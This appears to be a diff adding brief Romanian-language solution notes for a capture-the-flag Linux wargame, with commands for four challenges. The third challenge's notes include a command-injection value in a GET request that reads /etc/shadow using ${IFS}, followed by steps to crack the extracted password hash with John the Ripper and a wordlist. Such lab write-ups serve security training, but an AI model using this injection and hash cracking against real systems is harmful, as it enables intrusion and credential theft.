@@ -1,0 +1,23 @@
+Fiecare raspuns este parola pentru uurmatorul utilizator.
+
+chall0:
+cat ~/Documents/.hidden1/.hidden2/.hidden3/.flag
+
+chall1:
+cd /home/chall1/Personal/files
+find . -maxdepth 1 -type f -name "*.txt" | grep -E './[^/]*[0-9][^/]*[A-Za-z][^/]*\.txt' | xargs -I{} sh -c "sed -n '1337p' '{}'" | grep : | sort -u
+
+chall2:
+ps aux
+Gasim whisperers. Luam PID-ul oricaruia si dam:
+cat /proc/[PID]/fd/255 -- Pentru a vedea source code-ul in care apare flag-ul
+
+chall3:
+
+Comanda in GET: cat${IFS}/etc/shadow
+
+Crack parola:
+Se ia doar hashul(campul 2).
+Se pune in kali in ~/hash.
+folosim john:
+john ~/hash --wordlist=./rockyou.txt
